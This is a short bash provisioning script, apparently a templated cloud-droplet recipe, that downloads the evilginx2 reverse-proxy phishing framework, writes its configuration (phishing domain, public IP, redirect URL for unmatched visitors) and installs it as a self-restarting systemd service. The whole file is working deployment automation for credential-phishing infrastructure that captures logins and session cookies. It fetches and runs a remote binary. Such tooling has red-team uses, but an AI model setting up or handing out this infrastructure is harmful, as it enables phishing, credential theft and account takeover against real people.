#!/bin/bash
# @name: evilginx2
# @desc: evilginx2 reverse proxy phishing framework - download and run as systemd service
# @var: Domain= - Domain for phishing (evilginx2 uses it for auto-TLS)
# @var: ExternalIP= - Public IP of this Droplet (leave empty to auto-detect)
# @var: RedirectURL=https://www.google.com - URL to redirect unmatched requests
set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update -y
apt-get install -y curl unzip

# Auto-detect public IP if not set
EXTIP="{{.ExternalIP}}"
if [[ -z "$EXTIP" ]]; then
    EXTIP=$(curl -4 -s https://ifconfig.me)
fi

# Download latest evilginx2
EG_VERSION=$(curl -s https://api.github.com/repos/kgretzky/evilginx2/releases/latest | grep '"tag_name"' | cut -d'"' -f4)
curl -sL "https://github.com/kgretzky/evilginx2/releases/download/${EG_VERSION}/evilginx-linux-amd64.tar.gz" \
    -o /tmp/evilginx.tar.gz
mkdir -p /opt/evilginx2
tar -xzf /tmp/evilginx.tar.gz -C /opt/evilginx2

# Phishlets directory
mkdir -p /opt/evilginx2/phishlets

# Config
mkdir -p /root/.evilginx
cat > /root/.evilginx/config.yaml << EGCFG
general:
  domain: {{.Domain}}
  external_ipv4: ${EXTIP}
  bind_ipv4: ""
  https_port: 443
  http_port: 80
  dns_port: 53
  unauth_url: {{.RedirectURL}}
EGCFG

cat > /etc/systemd/system/evilginx2.service << 'UNIT'
[Unit]
Description=evilginx2 Reverse Proxy Phishing Framework
After=network.target
[Service]
WorkingDirectory=/opt/evilginx2
ExecStart=/opt/evilginx2/evilginx -p /opt/evilginx2/phishlets
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now evilginx2
echo "[evilginx2] started - domain: {{.Domain}}  ip: ${EXTIP}"
echo "[evilginx2] manage via: journalctl -fu evilginx2"
echo "[evilginx2] add phishlets to /opt/evilginx2/phishlets/"
